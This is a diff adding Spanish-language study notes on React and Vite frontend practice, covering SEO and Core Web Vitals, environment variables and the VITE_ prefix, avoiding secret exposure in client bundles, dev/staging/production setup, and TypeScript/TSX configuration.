+Etiquetas alt: Como mencionamos antes, cada imagen no decorativa debe tener un atributo alt descriptivo. Esto no solo ayuda a la accesibilidad, sino que también permite a los crawlers entender el contenido de la imagen.
+Lazy Loading Nativo: Implementa la carga diferida (lazy loading) para imágenes que están debajo del pliegue (fuera de la vista inicial) usando el atributo nativo loading="lazy    
+
+Rendimiento de Carga (Core Web Vitals)
+Google usa las métricas de Core Web Vitals (Métricas Web Esenciales) para evaluar la experiencia de la página. Mejorar estas métricas impulsa el SEO.
+
+LCP (Largest Contentful Paint): El tiempo que tarda en cargarse el elemento de contenido más grande
+SSR/SSG y la optimización de imágenes son cruciales aquí.
+
+FID (First Input Delay) / INP (Interaction to Next Paint): Mide la interactividad.
+La carga diferida (lazy loading) de código JS con React.lazy() y Suspense es vital para reducir la cantidad de JS que el navegador tiene que procesar al inicio.
+
+CLS (Cumulative Layout Shift): Mide la estabilidad visual.
+Evita el movimiento inesperado del contenido después de la carga inicial
+(por ejemplo, reservando espacio con CSS para imágenes o anuncios que se cargan tarde).
+
+
+Datos Estructurados (Schema Markup)
+
+Microdatos JSON-LD: Implementa datos estructurados usando el formato JSON-LD para que Google entienda el contenido de la página y muestre rich results (resultados enriquecidos) en la SERP (página de resultados de búsqueda).
+Casos de Uso: Valoraciones de productos (Product), recetas (Recipe), información de contacto de la empresa (Organization), o preguntas frecuentes (FAQPage).
+
+
+Avanzadas y Mantenimiento
+
+Enrutamiento del lado del Servidor y Cliente
+
+Sitemaps Dinámicos: Si tu contenido cambia frecuentemente, genera un sitemap.xml
+dinámicamente en el servidor para que los crawlers conozcan todas las URL relevantes de tu sitio.    
+    
+Archivos robots.txt: Usa este archivo para indicar a los crawlers qué partes del sitio no deben rastrear (ej., rutas de administración o datos de usuario privados).
+
+
+Manejo de Errores y Redirecciones
+
+Páginas 404 Útiles: Crea una página 404 amigable en React que proporcione enlaces útiles a otras partes del sitio
+
+Redirecciones 301: Implementa redirecciones 301 (permanentes) a nivel de servidor o build (si usas Next.js) para cualquier URL antigua que haya cambiado.
+
+Nunca dependas de redirecciones hechas puramente con JavaScript después de que la página se carga.
+
+
+
+## Env
+
+Las Variables de Entorno son valores dinámicos que afectan la forma en que los procesos en ejecución (programas, scripts o aplicaciones) se comportan en una computadora.
+
+Interruptores globales o configuraciones externas que el programa lee al iniciarse para determinar dónde debe conectarse
+
+Qué nivel de registro debe usar o qué claves de acceso necesita.
+
+
+##### Es simplemente un par clave-valor definido fuera del código fuente de una aplicación.
+
+##### El entorno de ejecución (el sistema operativo, el shell, o el entorno de runtime como Node.js) hace que esta información esté disponible para la aplicación.
+
+Clave: El nombre de la variable (ej., NODE_ENV, DATABASE_URL).
+
+Valor: El dato asociado a la clave (ej., production, postgresql://user:pass@host/db).
+
+
+##### Las variables de entorno son la mejor práctica para evitar el Hardcoding
+
+de valores de configuración que cambian entre los distintos entornos de despliegue.
+
+Entorno | Valor de la Variable API_URL
+
+Desarrollo	http://localhost:8080/api
+Staging	https://api.staging.miempresa.com
+Producción	https://api.miempresa.com
+
+Si la URL de la API estuviera codificada en el código fuente, tendrías que modificar el código y recompilarlo cada vez que cambies de entorno
+
+##### Con variables de entorno, solo cambias el archivo de configuración externa (.env o la configuración del servidor).
+
+
+#### Usos y Tipos de Variables
+
+Se agrupan en dos categorías principales según su sensibilidad:
+
+1. Variables de Configuración (No Sensibles)
+
+Se usan para ajustar el comportamiento de la aplicación en un entorno específico.
+
+Modo de Ejecución: NODE_ENV (development, production).
+
+Rutas de API: API_URL, WEBSOCKET_URL.
+
+Puertos: PORT (el puerto en el que escucha un servidor
+
+
+2. Variables Sensibles (Secretos)
+
+Contienen información confidencial que nunca debe ser subida a repositorios públicos de código (Git).
+
+Credenciales de Bases de Datos: DB_PASSWORD, DB_USER.
+
+Claves Secretas de API: STRIPE_SECRET_KEY, JWT_SECRET.
+
+Tokens de Autenticación: AUTH0_CLIENT_SECRET.
+
+
+#### Implementación de vars env
+
+Aunque las variables existen a nivel del sistema operativo, en el desarrollo de aplicaciones se gestionan comúnmente de las siguientes maneras:
+
+    
+1. Archivos .env
+
+Para el desarrollo local, es estándar almacenar las variables en archivos llamados .env (o .env.development, .env.production).
+
+Estos archivos se cargan al inicio de la aplicación mediante librerías como dotenv (en Node.js).
+
+El archivo .env o .env.local debe estar siempre en el .gitignore para proteger los secretos.
+
+
+2. Entornos de Hosting (CI/CD)
+
+En producción, nunca se sube el archivo .env
+
+En su lugar, las variables se configuran directamente en la plataforma de despliegue
+
+(ej., Vercel, Netlify, AWS, Docker).
+
+Plataformas Cloud: Ofrecen una interfaz para ingresar las claves y valores, inyectándolos de forma segura en el proceso de la aplicación en tiempo de ejecución.
+
+
+3. Acceso en Código
+
+En la mayoría de los lenguajes, las variables se acceden a través de un objeto global.
+
+Node.js/JavaScript: `process.env.NOMBRE_VARIABLE`
+    
+Python: `os.environ['NOMBRE_VARIABLE']`
+
+
+#### Requerimiento del Bundler
+
+El archivo .env es una configuración para la herramienta de build, no para el código de tu aplicación directamente
+
+El bundler necesita acceder a ellos al inicio del proceso para poder inyectar las variables donde sean necesarias.
+
+El proceso de build (ejecutado por Vite) es el que lee el archivo .env en la raíz
+
+filtra las variables (solo las que tienen el prefijo VITE_ en el caso de Vite)
+
+y las pone a disposición del código a través de import.meta.env.
+
+
+Convención Estándar:
+
+Casi todas las herramientas de desarrollo y los runtimes de Node.js (incluidos los que usan librerías como dotenv) buscan automáticamente los archivos .env en el directorio de trabajo raíz donde se ejecuta el comando npm run dev o npm run build.
+
+
+Seguridad y .gitignore
+
+Al mantenerlos en la raíz, se facilita la gestión de seguridad con Git:
+
+El archivo .gitignore también está en la raíz, por lo que puedes agregar líneas como:
+
+```
+# Archivos sensibles que nunca deben ser subidos
+.env
+.env.local
+```
+
+Ubicación:
+
+.env:
+Raíz del Proyecto
+Variables de entorno del proyecto (leídas por Vite/Bundler).
+
+src/:
+Carpeta Principal
+Código fuente de la aplicación (archivos .js, .tsx, .css).
+
+public/:
+Carpeta Principal	
+Archivos estáticos que no necesitan ser procesados (imágenes, favicons).
+
+
+#### Archivos fuera de src
+
+Colocar los archivos de configuración en la raíz es mantener una separación estricta entre:
+
+1. Configuración del Entorno: Todo lo relacionado con el build, despliegue, variables secretas y scripts
+(ej., package.json, vite.config.js, .gitignore, y los .env). 
+Esto va en la raíz.
+
+2. Manejo por el Bundler (Vite/Webpack):
+Vite y otras herramientas de build están configuradas por defecto para buscar los archivos de configuración del proyecto en el directorio raíz.
+El bundler lee los archivos .env antes de comenzar la transpilación y la inyección de las variables.
+##### Si el archivo estuviera dentro de src/, el bundler podría no encontrarlo o intentar procesarlo como parte del código fuente, lo cual es incorrecto
+
+
+
+### Vars env en Vite
+
+Forma esencial de inyectar configuraciones dinámicas en tu frontend
+
+Permitiendo que la aplicación se comporte de manera diferente según el entorno en el que se esté ejecutando (desarrollo local, staging o producción).
+
+
+1. Acceso y Prefijo (VITE_)
+
+##### Vite carga las variables de entorno desde los archivos .env
+
+##### Las expone al código de tu aplicación a través de un objeto especial: import.meta.env.
+
+
+Regla del Prefijo:
+
+##### Para proteger las variables sensibles (que a veces se usan solo a nivel de build o servidor)
+
+y evitar exponerlas innecesariamente al frontend, Vite aplica un estricto filtro:
+
+1. Solo las variables que comienzan con VITE_ se exponen al código del lado del cliente (import.meta.env).
+
+2. Las variables sin este prefijo (ej., SECRET_KEY) permanecen privadas durante el proceso de build y nunca llegan al navegador
+
+Ej: Acceder a una variable llamada VITE_API_URL en tu código React
+
+```
+// Vite:
+const apiUrl = import.meta.env.VITE_API_URL;
+
+// En React:
+fetch(`${import.meta.env.VITE_API_URL}/usuarios`);
+```
+
+
+2. Archivos .env Específicos por Modo
+
+Vite usa el concepto de Modos de forma nativa
+
+Un modo es simplemente una cadena que define el entorno actual (similar a NODE_ENV).
+
+Por defecto, Vite tiene dos modos: development y production.
+
+
+Puedes crear archivos .env específicos para cada modo
+
+Vite los carga en el siguiente orden, sobrescribiendo los valores anteriores si hay conflictos:
+
+Archivo	| Modo de Carga |	Uso
+
+`.env`	Siempre	Variables por defecto que se aplican a todos los modos.
+`.env.local`	Siempre	Sobrescribe los valores de .env. Debe estar en .gitignore para variables locales o sensibles.
+`.env.[mode]`	Solo en el modo especificado	Configuración específica para ese modo (ej., .env.staging).
+`.env.[mode].local`	Solo en el modo especificado	Configuración local específica que sobrescribe a .env.[mode].
+
+
+Ejecutar un Modo Específico
+
+##### Puedes indicarle a Vite qué modo usar en el script de tu package.json:
+
+```
+"scripts": {
+  "dev": "vite", // -> Carga .env y .env.development
+  "build": "vite build", // -> Carga .env y .env.production
+  "preview:staging": "vite preview --mode staging" // -> Carga .env y .env.staging
+}
+```
+
+
+3. Variables de Entorno Integradas
+
+Vite automáticamente expone algunas variables de entorno útiles que no necesitan el prefijo VITE_ ni estar en un archivo .env
+
+1. import.meta.env.MODE
+El modo actual en el que se está ejecutando la aplicación 
+(ej. development, production, staging).
+uso: development
+
+2. import.meta.env.BASE_URL
+La URL base pública donde se sirve la aplicación.
+(Útil para manejar activos estáticos).
+uso: /
+
+3. import.meta.env.DEV
+Booleano que es true si el modo actual es development.
+uso: true
+
+4. import.meta.env.PROD
+Booleano que es true si el modo actual es production.
+uso: false
+
+Estas variables integradas te permiten aplicar lógica condicional en tu código:
+
+```
+if (import.meta.env.DEV) {
+  console.log('Ejecutando en modo de desarrollo...');
+}
+```
+
+
+#### Variables en .env
+
+##### Todas aquellas configuraciones que son sensibles o que cambian según el entorno de despliegue (desarrollo, staging, producción).
+
+##### Objetivo: nunca subir información sensible o específica del entorno al repositorio de Git.
+
+categorías clave y ejemplos de variables a incluir en .env
+
+
+1. Claves Secretas y Tokens (Confidencialidad)
+
+Estas variables deben ser tratadas con la máxima cautela y nunca deben ser subidas a Git
+
+Por lo general, solo se necesitan en el backend, pero si tu frontend necesita una clave pública de un servicio, debe ir aquí.
+
+
+Variable | Uso / Tipo | Nota de Seguridad
+
+SECRET_KEY
+Clave criptográfica para firmar cookies, sesiones, o tokens JWT (Backend).
+¡CRÍTICO! Nunca la expongas al frontend.
+
+DB_PASSWORD:
+Contraseña de la base de datos (Backend).
+¡CRÍTICO! Nunca la expongas.
+
+FIREBASE_PRIVATE_KEY:
+Claves privadas de servicios en la nube (Backend/Admin).
+¡CRÍTICO! Nunca la expongas.
+
+STRIPE_PUBLIC_KEY:
+Clave pública de servicios de pago (Frontend).
+Se puede exponer, pero debe configurarse en .env.
+
+
+2. Configuraciones de Entorno (Cambio Constante)
+
+##### Variables que cambian obligatoriamente entre tu máquina local y el servidor de producción.
+
+Variable | Propósito | Ejemplo de Desarrollo (.env.development)
+
+API_BASE_URL:
+URL base de tu backend o API principal.
+http://localhost:8080/v1
+
+CLOUDINARY_URL:
+URL o endpoint de tu servicio de almacenamiento de imágenes.
+https://api.cloudinary.com/v1_1/dev-bucket
+
+EMAIL_HOST:
+Host, puerto y credenciales del servicio de envío de correos (Backend).
+smtp.mailtrap.io
+
+NODE_ENV:
+Define el modo de la aplicación
+(solo si no lo configura la herramienta de build).
+development
+
+
+3. Servicios de Terceros (API Keys Públicas)
+
+Cualquier clave pública necesaria para servicios externos debe ir en el archivo .env para facilitar el cambio entre claves de prueba y claves de producción.
+
+Variable	Propósito	Tecnología
+
+MAPBOX_API_KEY:
+Clave pública para mapas y geolocalización.
+Mapbox, Google Maps, etc.
+
+ANALYTICS_TRACKING_ID:
+ID de seguimiento para herramientas de analítica.
+Google Analytics, Plausible, etc.
+
+SENTRY_DSN_
+Clave para el seguimiento de errores en tiempo real.
+Sentry, DataDog, etc.
+
+
+##### Uso de var .env:
+
+Debes incluir una variable en .env si cumple con al menos una de estas condiciones:
+
+1. Es un secreto: Contraseñas, claves de bases de datos, tokens privados.
+
+2. Cambia por entorno: La URL de la API es diferente en desarrollo (localhost) que en producción.
+
+3. Es una configuración de flag: Usada para habilitar/deshabilitar una característica rápidamente sin modificar el código (ej., FEATURE_BETA_ENABLED=true).
+
+El archivo .env (o su versión local, .env.local) debe estar siempre incluido en el .gitignore para evitar que esta información sensible o variable se publique en tu repositorio de Git.
+
+
+### Exposición de variables sensibles
+
+Significa que se ha incluido información crítica (como claves privadas, contraseñas, tokens o URLs de bases de datos)
+
+En el código JavaScript compilado que se descarga y ejecuta en el navegador del usuario
+
+Es una vulnerabilidad de seguridad grave
+
+Cualquier usuario puede ver el código fuente (a través de las herramientas de desarrollador) y acceder a esa información.
+
+
+##### Las herramientas de build modernas inyectan las variables de entorno (.env) directamente en el código JavaScript durante la compilación.
+
+##### Si tú expones una variable que solo debería ser conocida por el servidor, esta se vuelve pública.
+
+Una variable se vuelve sensible si permite a un atacante tomar control, suplantar identidad o acceder a datos privados.
+
+
+1. Claves Secretas del Servidor (Peor caso)
+
+El error más peligroso. 
+
+Las claves privadas (o secrets) se usan para firmar datos, autenticar servidores o acceder a servicios con privilegios elevados 
+
+
+Variable Sensible |	Riesgo
+
+VITE_API_PRIVATE_KEY:
+Si se usa para firmar tokens JWT, un atacante puede generar tokens válidos
+y suplantar a cualquier usuario o administrador.
+
+VITE_DB_PASSWORD:
+Permite al atacante intentar una conexión directa a tu base de datos
+si las reglas de seguridad son débiles.
+ 
+VITE_CLOUDINARY_SECRET:
+Permite al atacante subir, eliminar o manipular todos los archivos de tu servicio de almacenamiento en la nube.
+ 
+ 
+2. Claves de Servicios con Control de Gasto
+
+Aunque sean "claves públicas", algunas claves se facturan por uso.
+
+Exponerlas permite el abuso.
+
+VITE_MAPS_BILLING_KEY:
+Un atacante puede tomar la clave y usarla en su propia aplicación
+agotando tu cuota y generando altos costos de facturación.
+
+
+Ejemplo:
+clave privada de API que el servidor necesita para autenticar una solicitud
+y la incluyes en tu archivo .env del frontend
+
+Archivo .env: 
+
+```
+# Esta clave es solo para el servidor
+VITE_SERVER_SECRET=mi-clave-super-secreta-12345
+VITE_API_URL=https://api.miaplicacion.com
+```
+
+Frontend:
+
+```
+// La clave sensible se inyecta aquí.
+const secret = import.meta.env.VITE_SERVER_SECRET;
+
+// Si la usas para enviar una solicitud, no importa: ¡ya está visible!
+fetch(import.meta.env.VITE_API_URL, {
+  method: 'POST',
+  headers: {
+    'X-Auth-Secret': secret // ¡La clave se envía y queda expuesta en la red!
+  }
+});
+```
+
+1. El atacante navega a tu sitio.
+
+2. Abre las herramientas de desarrollador (F12) y va a la pestaña "Source" (Fuentes).
+
+3. Busca en el bundle de JavaScript (ej., main.js) o en la pestaña "Network" (Red) y encuentra la cadena mi-clave-super-secreta-12345.
+
+4. Una vez obtenida la clave, puede usarla para interactuar con tu API y actuar maliciosamente.
+
+
+Solución:
+
+##### La clave nunca debe enviarse directamente desde el frontend
+
+##### El frontend debe enviar una credencial pública (como un nombre de usuario/contraseña o un refresh token).
+
+##### El servidor es el único lugar donde debe residir la lógica que requiere la clave sensible:
+
+1. Frontend: Envía credenciales de usuario.
+
+2. Backend: Recibe las credenciales, usa la clave privada (almacenada solo en el servidor) para firmar un token JWT, y lo envía de vuelta al frontend.
+
+3. Frontend: Solo almacena y usa el token JWT (que es público y expira).
+
+
+
+### Entorno de Desarrollo 
+
+##### Esencial para la eficiencia del equipo, la calidad del código y la estabilidad del proyecto
+
+1. Desarrollo Base
+
+Entorno Consistente:
+NVM (Node Version Manager)
+Permite a todos los desarrolladores usar exactamente la misma versión de Node.js,
+
+Construcción Rápida:
+Vite / Webpack (Configurado)
+Asegúrate de que el servidor de desarrollo (dev server) y el Hot Module Replacement (HMR) sean instantáneos.
+
+Gestión de Paquetes:
+pnpm o Yarn
+Usa un gestor de paquetes moderno para instalaciones rápidas y para optimizar el espacio en disco (pnpm)
+o para el manejo robusto de workspaces (Yarn/pnpm).
+
+
+2. Calidad de Código y Automatización
+
+Tipado Estricto (TypeScript):
+Configura el tsconfig.json con strict: true
+Esto atrapa la inmensa mayoría de errores de lógica antes de que el código se ejecute.
+
+Tipado de API: Define tipos e interfaces para los datos que recibes de la API
+Usa librerías como Zod para validar en runtime que los datos recibidos cumplen con tus modelos esperados.
+
+
+Linters y Formateadores:
+
+ESLint: Configúralo con plugins específicos de la librería que uses (ej., eslint-plugin-react-hooks) para forzar las reglas de los hooks y las buenas prácticas de React.
+Prettier: Úsalo para el formateo automático del código. Es una regla de estilo que no debe ser debatida ni revisada en code review. Configura tu IDE para que se ejecute al guardar el archivo
+
+##### Hooks de Pre-Commit (Husky): Configura Husky para que ejecute automáticamente Prettier y ESLint antes de cada git commit
+Esto evita que el código con errores de estilo o fallos básicos entre al repositorio.
+
+
+Importaciones Absolutas:
+
+Alias de Rutas: Configura alias de rutas (@/ o ~/) en la configuración de tu bundler (vite.config.js) y en tsconfig.json
+Esto simplifica las importaciones, evita rutas relativas largas (../../../) y facilita las refactorizaciones.
+
+
+3. Gestión del Estado y Datos
+
+Inmutabilidad:
+
+Prioriza useMemo y useCallback: Usa estos hooks para estabilizar las referencias de objetos, arreglos y funciones que se pasan a componentes hijos memorizados
+Esto es clave para que las optimizaciones de React funcionen.
+
+Copias Inmutables: Nunca modifiques el estado directamente.
+Utiliza el operador Spread (...) o funciones inmutables (map, filter, slice) para crear copias del estado antes de aplicar cambios.
+
+
+Gestión de Datos Remotos:
+
+Herramientas de Caching: Usa librerías dedicadas al data fetching (ej., TanStack Query).
+Estas manejan automáticamente el estado de carga, el caching, la invalidación y los reintentos, simplificando enormemente la lógica de tus componentes.
+
+
+4. Entornos y Configuración Local
+
+Variables de Entorno Seguras:
+
+##### Prefijos de Exposición: En Vite, usa el prefijo VITE_ solo para las variables que deben ser accesibles en el navegador (ej., VITE_API_URL).
+##### Asegúrate de que ninguna clave privada o secreta lleve este prefijo.
+
+Archivos por Entorno: Usa .env.development, .env.staging, y .env.production para gestionar las URLs de la API y las flags de funciones por separado.
+
+
+Aislamiento del Entorno:
+
+Exclusión de Git: 
+##### Asegúrate de que tu archivo .gitignore incluya siempre la carpeta de dependencias (/node_modules) y la carpeta de build (/dist o /build), y cualquier archivo sensible o local (.env.local).
+
+
+Scripts Estándar:
+
+Scripts de package.json: Define scripts estándar y claros para el desarrollo y la calidad:
+
+"dev": Inicia el servidor de desarrollo.
+
+"build": Genera la versión de producción.
+
+"test": Ejecuta las pruebas unitarias.
+
+"lint": Ejecuta ESLint.
+
+"preview": Sirve la versión compilada localmente
+
+
+5. Pruebas
+
+Testing Library (UX): React Testing Library para escribir pruebas que se centren en el comportamiento del usuario y la accesibilida
+en lugar de probar detalles de implementación internos de los componentes.
+
+Unidad con Vitest: Utiliza Vitest (si usas Vite) para pruebas unitarias de Custom Hooks y utilidades.
+Es rápido y se integra perfectamente con el entorno de Vite.
+
+Pruebas de Integración: Incluye pruebas que verifiquen el flujo de trabajo entre varios componentes y la simulación de llamadas a la API
+(usando librerías como msw para mockear las API).
+
+
+
+### Entorno de Staging (o pre-producción)
+
+##### Este entorno debe ser un espejo lo más exacto posible de la producción, pero usado para pruebas finales.
+
+
+Separación de entornos:
+
+1. Variables de Entorno Propias
+
+El entorno de staging debe tener su propio conjunto de variables de entorno, diferentes a las de desarrollo y producción
+
+Archivos .env: Crea un archivo específico, por ejemplo, .env.staging.
+
+APIs de Staging: La variable de la URL de la API debe apuntar al backend de staging.
+VITE_API_URL en staging apunta a https://api.staging.miaplicacion.com.
+
+Claves de Servicios: Usa cuentas de prueba o sandboxes de terceros (ej., la cuenta de Stripe/PayPal de prueba) para evitar transacciones reales.
+
+
+2. Modo de Producción
+
+Compilación Optimizada: El build de staging siempre debe ejecutarse en modo production. Esto asegura que
+
+NODE_ENV sea production.
+
+Vite ejecute optimizaciones de rendimiento, minificación y tree-shaking.
+
+Se utilicen las versiones de librería optimizadas para producción (sin warnings de desarrollo).
+
+
+Mirroring de Infraestructura:
+
+##### El objetivo es que staging imite el entorno real tanto como sea posible para capturar problemas de despliegue y rendimiento.
+
+
+1. Servidor y Hosting Idénticos
+
+Mismo Proveedor: Despliega el frontend de staging en el mismo proveedor de hosting (ej., Vercel, Netlify, AWS S3/CloudFront) que usas para producción.
+
+Misma CDN: Si utilizas una CDN (Content Delivery Network), el staging debe usar una configuración de CDN similar para probar el caching y el rendimiento geográfico.
+
+
+2. Dominio Real
+
+Dominio Propio: El staging debe tener su propio subdominio claro, como staging.miaplicacion.com.
+
+Esto valida la configuración de certificados SSL, headers HTTP y cookies que pueden variar entre dominios.
+
+
+Pruebas de Calidad y Observabilidad:
+
+1. Ejecución de Tests Automatizados
+
+Pre-despliegue: La pipeline de CI/CD debe ejecutar todos los tests unitarios y de integración antes de desplegar a staging
+
+Pruebas End-to-End (E2E): Es el lugar ideal para ejecutar las pruebas E2E (usando herramientas como Cypress o Playwright),
+ya que prueban la aplicación completa en un entorno "casi real" que incluye el backend de staging.
+
+
+2. Monitoreo y Logging
+
+Seguimiento de Errores: Configura las mismas herramientas de monitoreo de errores de runtime (como Sentry o New Relic) en staging
+Esto asegura que el monitoreo funcionará en producción y captura cualquier error que ocurra durante las pruebas manuales.
+
+Logging: Los logs de staging deben estar separados de los de producción (usando un prefijo o tag), pero deben tener el mismo nivel de detalle para debugging si falla el build o una prueba
+
+
+Colaboración y Workflow
+
+1. Pipeline de CI/CD
+
+Despliegue Continuo (CD): Configura la automatización (GitHub Actions, GitLab CI, etc.) para que cada merge a una rama de revisión
+(ej., release/v2.0 o develop) active automáticamente el despliegue a staging.
+
+Puerta de Producción: El entorno de staging debe actuar como el último "gate" antes de que el código llegue a la rama main y, por lo tanto, a producción. 
+Una vez que staging está aprobado, el equipo puede confiar en el merge o deploy final.
+
+
+2. Acceso Controlado
+
+Autenticación de Staging: Si la aplicación está disponible públicamente, considera proteger el entorno de staging con una autenticación simple
+(ej., password global o autenticación HTTP básica) para que solo los probadores, stakeholders y clientes específicos puedan acceder.
+
+Pruebas de Carga (Load Testing)
+Simulación: Si tu aplicación tiene requerimientos de alto tráfico, staging es el lugar para realizar pruebas de carga ligeras para asegurar que el frontend y la conexión con el backend de staging se comportan bien bajo estrés.
+
+
+
+### Entorno de Producción
+
+##### Este entorno debe priorizar la seguridad, la velocidad de carga y la estabilidad por encima de todo.
+
+1. Seguridad y Exposición de Variables
+
+Cero Variables Sensibles:
+
+Aislamiento Total: Asegúrate de que ninguna variable secreta (contraseñas, tokens privados, claves de bases de datos) esté en el archivo .env.production ni en el código compilado
+Estas deben residir únicamente en el servidor de backend o en el sistema de build (CI/CD) si son necesarias para la compilación.
+
+Solo Claves Públicas: Las únicas claves que debe exponer tu frontend son las claves públicas de servicios de terceros:
+(Stripe public key, Google Analytics ID).
+
+
+Uso Exclusivo de HTTPS:
+
+Certificados SSL/TLS: Asegúrate de que el sitio de producción se sirva siempre bajo HTTPS
+Esto garantiza que toda la comunicación entre el navegador del usuario y el servidor esté encriptada, protegiendo datos como tokens de sesión.
+
+HSTS (HTTP Strict Transport Security):
+Configura los headers de respuesta del servidor o CDN para forzar que el navegador solo se conecte a través de HTTPS, incluso si el usuario intenta acceder por HTTP
+
+
+2. Rendimiento y Velocidad de Carga
+
+Optimización del Build:
+
+Minificación y Compresión: Asegúrate de que tu bundler (Vite, Webpack) esté minificando (reduciendo el tamaño de archivos JS/CSS)
+y aplicando tree-shaking (eliminando código muerto) al máximo.
+
+Compresión Avanzada: Configura el servidor o la CDN para servir los archivos con compresión moderna
+(como Brotli o Gzip de alto nivel) en lugar de raw JS/CSS.
+
+
+Almacenamiento en Caché (Caching):
+
+Cache-Busting: Asegúrate de que tu build utilice nombres de archivos con hashes (main.a1b2c3d4.js).
+Esto permite que los usuarios almacenen estos archivos estáticos en cache por un tiempo muy largo (ej., un año)
+mientras que el archivo index.html (que cambia con cada despliegue) se cachea por un tiempo muy corto.
+
+Control de Headers: Configura los headers Cache-Control en el servidor de activos (CDN) de la siguiente manera
+Archivos Estáticos (JS/CSS/Imágenes): Cache-Control: max-age=31536000, immutable.
+Archivo index.html (o Root): Cache-Control: no-cache, must-revalidate.
+
+
+Despliegue Global (CDN):
+
+Red de Distribución de Contenido (CDN): Despliega siempre tus activos estáticos (JS, CSS, imágenes) a través de una CDN
+(ej., Cloudflare, CloudFront, Vercel Edge Network)
+
+Una CDN almacena copias de tu sitio en servidores ubicados geográficamente más cerca de tus usuarios
+reduciendo drásticamente la latencia.
+
+
+3. Estabilidad y Monitoreo
+
+Logs y Monitoreo de Errores:
+
+APM (Application Performance Monitoring): Utiliza servicios como Sentry
+DataDog o New Relic para el monitoreo de errores en tiempo real en producción.
+Esto te alertará inmediatamente si ocurre un error de JavaScript en el navegador de un usuario.
+
+Separación de Logs:
+Los logs de errores de producción deben estar separados y priorizados de los de staging o desarrollo
+Solo los errores de producción deben generar alertas de alta prioridad.
+
+
+Pruebas Post-Despliegue:
+Smoke Tests: Configura un conjunto de pruebas mínimas y rápidas (los smoke tests) en tu pipeline de CI/CD para que se ejecuten inmediatamente después del despliegue en producción.
+Esto verifica que las rutas clave y la conexión a la API están funcionando.
+
+
+Estrategia de Rollback:
+
+Inmutabilidad del Despliegue: Asegúrate de que tu proceso de despliegue sea inmutable.
+Cada nuevo build es una carpeta/artefacto totalmente nuevo
+
+Rollback Rápido: Configura tu sistema de hosting para que si se detecta un error grave post-desdespliegue, puedas hacer un rollback instantáneo a la versión estable anterior sin tener que ejecutar un build nuevo.
+
+
+4. Configuración Específica de Producción
+
+Entorno de Producción Estricto:
+
+NODE_ENV: Asegúrate de que el build final siempre establezca la variable de entorno NODE_ENV a production
+Esto activa el modo de producción en librerías como React, eliminando advertencias de desarrollo
+logging innecesario y checks de rendimiento que solo se usan en desarrollo.
+
+
+Deshabilitar Mapas de Origen (Source Maps):
+
+Control de Source Maps: Los source maps (.map files) son útiles para depurar en producción, pero revelan tu código fuente sin minificar.
+Buena Práctica: Si decides incluirlos para Sentry o monitoreo, asegúrate de que estén protegidos y no sean accesibles públicamente o que solo se carguen a través de tu servicio de monitoreo
+Como práctica de seguridad, a menudo se deshabilitan por completo o se sirven solo en staging.
+
+
+Archivos de Rutas:
+
+robots.txt: Asegúrate de que este archivo permita a los crawlers de búsqueda indexar todas las rutas importantes
+(a menos que quieras específicamente ocultar una página, como la de administración).
+
+sitemap.xml: Genera y publica un archivo sitemap.xml actualizado con todas las rutas de tu sitio para ayudar a los motores de búsqueda a rastrear tu sitio de manera eficiente.
+
+
+
+
+# TS, tsx y React
+
+Vite tiene soporte nativo de alto rendimiento para TypeScript y TSX, ya que utiliza esbuild para la transpilación, lo que lo hace muy rápido.
+
+1. Comando de Vite
+
+```
+npm create vite@latest
+```
+
+2. Opciones
+
+Project name: ...
+Framework: React
+Variant: TypeScript o TypeScript + SWC
+
+SWC es un transpilador alternativo aún más rápido, pero TypeScript estándar es suficie
+
+
+Generará a estructura del proyecto con los archivos necesarios:
+
+main.jsx se convertirá en main.tsx.
+
+App.jsx se convertirá en App.tsx.
+
+Se creará un archivo tsconfig.json (archivo de configuración de TypeScript).
+
+
+Estructura y config
+
+Si ya tienes un proyecto en JavaScript y quieres migrar, o simplemente quieres revisar la configuración, estos son los archivos clave:
+
+Archivos de Código:
+##### Usa la extensión .ts para archivos que contienen lógica pura, Custom Hooks o utilidades (sin sintaxis JSX).
+Ejemplo: useFetch.ts, apiService.ts
+
+##### Usa la extensión .tsx para componentes de React que contienen sintaxis JSX.
+Ejemplo: Button.tsx, App.tsx.
+
+tsconfig.json:
+Vite genera una plantilla funcional, pero debes entender algunos campos:
+
+target:
+"ES2020" (o más reciente)
+Define el nivel de sintaxis JavaScript a la que compilará el código. 
+Vite suele usar un valor moderno.
+
+jsx:	
+"react-jsx"
+Indica que TypeScript debe esperar y procesar la sintaxis JSX
+delegando la transpilación final a la herramienta de build (Vite/esbuild).
+
+module:	
+"ESNext"
+Asegura el uso de módulos modernos (import/export).
+
+baseUrl:	"."
+Se usa junto con paths para configurar importaciones absolutas
+(ej., import '@/components/Button').
+
+
+#### Configuración del Componente (Componente Funcional):
+
+##### En un archivo .tsx, debes tipar explícitamente las props de tu componente usando interfaces o tipos.
+
+```
+// Button.tsx
+
+// 1. Definir la interfaz de las Props
+interface ButtonProps {
+  text: string;
+  onClick: () => void; // Tipar las funciones
+  disabled?: boolean; // El '?' indica que la prop es opcional
+}
+
+// 2. Tipar el componente funcional con React.FC (o solo las props)
+const Button: React.FC<ButtonProps> = ({ text, onClick, disabled = false }) => {
+  return (
+    <button onClick={onClick} disabled={disabled}>
+      {text}
+    </button>
+  );
+};
+
+export default Button;
+```
+
+Beneficios:
+
+1. Detección de Errores Temprana: El compilador de TypeScript atrapará errores (como pasar un string donde se espera un number) antes de que el código se ejecute en el navegador.
+
+2. Mejor Refactorización: Puedes renombrar variables, componentes o propiedades con confianza en tu IDE
+sabiendo que el sistema de tipos actualizará todas las referencias.
+
+3. Documentación Implícita: La definición de tipos e interfaces sirve como documentación instantánea para ti y tu equipo. 
+
+4. Desarrollo Rápido: Aunque configures TypeScript, Vite sigue siendo extremadamente rápido porque solo utiliza TypeScript para la verificación de tipos, delegando la transpilación (conversión de TSX a JS) al rapidísimo esbuild.
+
+
+### Prácticas
+
+1. Archivos y Convenciones
+
+.tsx vs. .ts: Utiliza .tsx solo para archivos que contengan sintaxis JSX (componentes).
+
+Usa .ts para Custom Hooks, utilidades, servicios de API y reducers que no devuelvan JSX.
+
+
+2. tsconfig.json Estricto
+
+Asegúrate de que la propiedad strict esté en true en tu tsconfig.json.
+
+Esto activa las verificaciones más estrictas del compilador, como noImplicitAny y strictNullChecks, capturando errores comunes.
+
+
+Uso de Alias para Importaciones:
+
+1.  Rutas Absolutas: Configura alias de rutas (ej., @/) en tsconfig.json y vite.config.js.
+
+Configura alias de rutas (ej., @/) en tsconfig.json y vite.config.js.
+
